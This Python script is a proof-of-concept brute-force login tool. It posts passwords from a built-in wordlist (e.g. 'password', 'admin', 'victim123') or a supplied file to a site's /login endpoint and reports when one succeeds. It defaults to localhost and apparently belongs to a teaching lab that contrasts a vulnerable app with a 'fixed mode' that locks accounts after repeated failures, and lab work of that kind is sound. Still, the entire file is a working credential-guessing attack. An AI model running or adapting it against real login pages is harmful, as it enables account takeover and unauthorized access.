from __future__ import annotations

import argparse
import http.cookiejar
import urllib.parse
import urllib.request


DEFAULT_WORDLIST = [
    "123",
    "password",
    "qwerty",
    "admin",
    "letmein",
    "victim123",
    "Password123!",
]


def try_login(opener: urllib.request.OpenerDirector, base: str, email: str, password: str) -> tuple[bool, str]:
    data = urllib.parse.urlencode({"email": email, "password": password}).encode()
    request = urllib.request.Request(f"{base}/login", data=data, method="POST")
    try:
        response = opener.open(request, timeout=5)
        final_url = response.geturl()
        body = response.read().decode("utf-8", errors="replace")
        return final_url.endswith("/dashboard") or "Logged in as" in body, body
    except urllib.error.HTTPError as exc:
        return False, exc.read().decode("utf-8", errors="replace")


def load_passwords(path: str | None) -> list[str]:
    if not path:
        return DEFAULT_WORDLIST
    with open(path, "r", encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip()]


def main() -> None:
    parser = argparse.ArgumentParser(description="PoC: brute force login attempts")
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--email", required=True)
    parser.add_argument("--wordlist")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    for password in load_passwords(args.wordlist):
        success, body = try_login(opener, base, args.email, password)
        signal = "success" if success else "failed"
        print(f"{password:20} {signal}")
        if success:
            print(f"\nPassword found: {password!r}")
            break
        if "Invalid credentials" in body and "VULNERABLE" not in body:
            print("Fixed mode keeps errors generic and locks after repeated failures.")
    else:
        print("\nNo password found in this wordlist.")


if __name__ == "__main__":
    main()
